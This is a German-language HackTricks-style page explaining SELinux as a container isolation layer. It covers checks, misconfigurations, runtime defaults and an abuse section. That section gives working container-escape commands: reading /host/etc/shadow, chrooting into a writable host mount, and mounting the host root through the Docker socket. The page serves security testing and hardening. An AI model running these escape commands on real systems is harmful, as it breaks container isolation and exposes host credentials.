# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

SELinux ist eine **label-basierte obligatorische Zugriffskontrolle**. Jeder relevante Prozess und jedes Objekt kann einen security context tragen, und die Policy entscheidet, welche Domains mit welchen Types und auf welche Weise interagieren dürfen. In containerisierten Umgebungen bedeutet das in der Regel, dass der Runtime den Containerprozess unter einer eingeschränkten container domain startet und den Containerinhalt mit entsprechenden Types labelt. Wenn die Policy korrekt funktioniert, kann der Prozess die Dinge lesen und schreiben, die sein Label zu berühren erwartet, während ihm der Zugriff auf anderen Host-Content verweigert wird, selbst wenn dieser Content durch ein Mount sichtbar wird.

Dies ist einer der mächtigsten hostseitigen Schutzmechanismen, die in gängigen Linux-Container-Deployments verfügbar sind. Er ist besonders wichtig auf Fedora, RHEL, CentOS Stream, OpenShift und in anderen SELinux-zentrierten Ökosystemen. In diesen Umgebungen wird ein Prüfer, der SELinux ignoriert, oft missverstehen, warum ein auf den ersten Blick offensichtlicher Pfad zur Kompromittierung des Hosts tatsächlich blockiert ist.

## AppArmor Vs SELinux

Der einfachste hochrangige Unterschied ist, dass AppArmor path-basiert ist, während SELinux **label-basiert** ist. Das hat große Konsequenzen für die Container-Sicherheit. Eine path-basierte Policy kann sich anders verhalten, wenn derselbe Host-Content unter einem unerwarteten Mount-Pfad sichtbar wird. Eine label-basierte Policy fragt stattdessen, welches Label das Objekt hat und was die Prozess-Domain damit tun darf. Das macht SELinux nicht einfach, aber es macht es robust gegenüber einer Klasse von Pfad-Tricks, auf die Verteidiger in AppArmor-basierten Systemen manchmal versehentlich hereinfallen.

Weil das Modell label-orientiert ist, sind die Handhabung von Container-Volumes und Entscheidungen zum Relabeling sicherheitskritisch. Wenn der Runtime oder der Betreiber Labels zu großzügig ändert, um „make mounts work“, kann die Policy-Grenze, die die Workload enthalten sollte, deutlich schwächer werden als beabsichtigt.

## Labor

Um zu prüfen, ob SELinux auf dem Host aktiv ist:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Um vorhandene Labels auf dem Host zu prüfen:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Um einen normalen Lauf mit einem zu vergleichen, bei dem labeling deaktiviert ist:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Auf einem SELinux-aktivierten Host ist dies eine sehr praxisnahe Demonstration, weil sie den Unterschied zwischen einer Workload zeigt, die unter der erwarteten Container-Domain läuft, und einer, der diese Durchsetzungs‑Schicht entzogen wurde.

## Runtime Usage

Podman ist besonders gut auf SELinux abgestimmt auf Systemen, bei denen SELinux Teil der Plattform-Defaults ist. Rootless Podman plus SELinux ist eine der stärksten Mainstream-Container-Baselines, weil der Prozess auf der Host-Seite bereits unprivilegiert ist und zusätzlich durch MAC policy eingeschränkt bleibt. Docker kann SELinux dort ebenfalls nutzen, wo es unterstützt wird, obwohl Administratoren es manchmal deaktivieren, um Reibung beim Volume-Labeling zu umgehen. CRI-O und OpenShift verlassen sich stark auf SELinux als Teil ihrer Container-Isolationsstrategie. Kubernetes kann SELinux-bezogene Einstellungen ebenfalls bereitstellen, aber ihr Wert hängt natürlich davon ab, ob das Node-OS SELinux tatsächlich unterstützt und durchsetzt.

Die wiederkehrende Lektion ist, dass SELinux kein optionales Garnitur ist. In den Ökosystemen, die darum gebaut sind, ist es Teil der erwarteten Sicherheitsgrenze.

## Misconfigurations

Der klassische Fehler ist `label=disable`. Operativ passiert das oft, weil ein Volume-Mount verweigert wurde und die schnellste kurzfristige Lösung darin bestand, SELinux aus der Gleichung zu nehmen, anstatt das Labeling-Modell zu reparieren. Ein anderer häufiger Fehler ist fehlerhaftes Relabeln von Host-Inhalten. Breite Relabel-Operationen können die Anwendung funktionieren lassen, aber sie können auch den Bereich dessen erweitern, was der Container anfassen darf, weit über das ursprünglich Beabsichtigte hinaus.

Wichtig ist auch, nicht SELinux im installierten Zustand mit dem effektiven SELinux zu verwechseln. Ein Host kann SELinux unterstützen und trotzdem im permissive-Modus sein, oder der Runtime könnte die Workload nicht unter der erwarteten Domain starten. In solchen Fällen ist der Schutz viel schwächer, als die Dokumentation vielleicht vermuten lässt.

## Abuse

Wenn SELinux fehlt, permissive ist oder für die Workload weitgehend deaktiviert wurde, werden host‑gemountete Pfade viel leichter ausnutzbar. Derselbe bind mount, der sonst durch Labels eingeschränkt wäre, kann zu einem direkten Zugang zu Host-Daten oder Host-Modifikationen werden. Das ist besonders relevant in Kombination mit beschreibbaren Volume-Mounts, container runtime-Verzeichnissen oder operationellen Abkürzungen, die sensible Host-Pfade der Bequemlichkeit halber offengelegt haben.

SELinux erklärt oft, warum ein generisches Breakout-Writeup auf einem Host sofort funktioniert, auf einem anderen aber wiederholt fehlschlägt, obwohl die Runtime-Flags ähnlich aussehen. Die fehlende Zutat ist häufig nicht einmal ein Namespace oder eine Capability, sondern eine Label-Grenze, die intakt geblieben ist.

Die schnellste praktische Überprüfung ist, den aktiven Kontext zu vergleichen und dann gemountete Host-Pfade oder Runtime-Verzeichnisse zu prüfen, die normalerweise durch Labels eingeschränkt wären:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Wenn ein host bind mount vorhanden ist und SELinux-Labeling deaktiviert oder abgeschwächt wurde, kommt es häufig zuerst zu einer Informationsoffenlegung:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Wenn das mount schreibbar ist und der Container aus Sicht des Kernels effektiv host-root ist, besteht der nächste Schritt darin, eine kontrollierte Host-Modifikation zu testen, anstatt zu raten:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Auf SELinux-capable Hosts kann das Entfernen von Labels in Laufzeit-Statusverzeichnissen ebenfalls direkte privilege-escalation-Pfade offenlegen:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Diese Befehle ersetzen keine vollständige Escape-Kette, zeigen aber sehr schnell, ob SELinux der Grund war, der den Zugriff auf Host-Daten oder die Änderung von Dateien auf dem Host verhindert hat.

### Vollständiges Beispiel: SELinux deaktiviert + schreibbares Host-Mount

Wenn SELinux-Labeling deaktiviert ist und das Host-Dateisystem unter `/host` schreibbar gemountet ist, wird ein vollständiger Host-Escape zu einem normalen Fall von bind-mount-Missbrauch:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn der `chroot` erfolgreich ist, arbeitet der container process jetzt vom host filesystem aus:
```bash
id
hostname
cat /etc/passwd | tail
```
### Vollständiges Beispiel: SELinux deaktiviert + Runtime-Verzeichnis

Wenn der Workload einen Runtime-Socket erreichen kann, sobald Labels deaktiviert sind, kann der Escape an die Runtime delegiert werden:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante Beobachtung ist, dass SELinux häufig die Kontrolle darstellte, die genau diese Art von host-path- oder runtime-state-Zugriff verhinderte.

## Prüfungen

Das Ziel der SELinux-Prüfungen ist es, zu bestätigen, dass SELinux aktiviert ist, den aktuellen security context zu identifizieren und zu prüfen, ob die Dateien oder Pfade, die Sie interessieren, tatsächlich label-confined sind.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Was hier interessant ist:

- `getenforce` sollte idealerweise `Enforcing` zurückgeben; `Permissive` oder `Disabled` ändern die Bedeutung des gesamten SELinux-Abschnitts.
- Wenn der aktuelle Prozesskontext unerwartet oder zu weit gefasst aussieht, läuft die Workload möglicherweise nicht unter der vorgesehenen Container-Policy.
- Wenn auf dem Host eingehängte Dateien oder Laufzeitverzeichnisse Labels haben, auf die der Prozess zu frei zugreifen kann, werden bind mounts deutlich gefährlicher.

Beim Prüfen eines Containers auf einer SELinux-fähigen Plattform sollte die Kennzeichnung nicht als Nebensache behandelt werden. In vielen Fällen ist sie einer der Hauptgründe, warum der Host noch nicht kompromittiert ist.

## Laufzeit-Standardwerte

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Hostabhängig | SELinux-Isolierung ist auf SELinux-aktivierten Hosts verfügbar, aber das genaue Verhalten hängt von der Host-/Daemon-Konfiguration ab | `--security-opt label=disable`, breites Umlabeln von Bind-Mounts, `--privileged` |
| Podman | Auf SELinux-Hosts meist aktiviert | SELinux-Isolierung ist bei Podman auf SELinux-Systemen ein normaler Bestandteil, sofern nicht deaktiviert | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Auf Pod-Ebene nicht allgemein automatisch zugewiesen | SELinux-Unterstützung ist vorhanden, aber Pods benötigen in der Regel `securityContext.seLinuxOptions` oder plattformspezifische Defaults; Laufzeit- und Node-Unterstützung sind erforderlich | schwache oder weit gefasste `seLinuxOptions`, Betrieb auf permissive/disabled Nodes, Plattform-Policies, die Labeling deaktivieren |
| CRI-O / OpenShift style deployments | Werden häufig stark genutzt | SELinux ist in diesen Umgebungen oft ein zentraler Bestandteil des Node-Isolationsmodells | eigene Policies, die den Zugriff zu weit aufweiten, Deaktivierung des Labelings aus Kompatibilitätsgründen |

Die SELinux-Standardeinstellungen sind distributionsabhängiger als seccomp-Defaults. Auf Fedora/RHEL/OpenShift-ähnlichen Systemen ist SELinux oft zentral für das Isolationsmodell. Auf Nicht-SELinux-Systemen ist es schlicht nicht vorhanden.
{{#include ../../../../banners/hacktricks-training.md}}
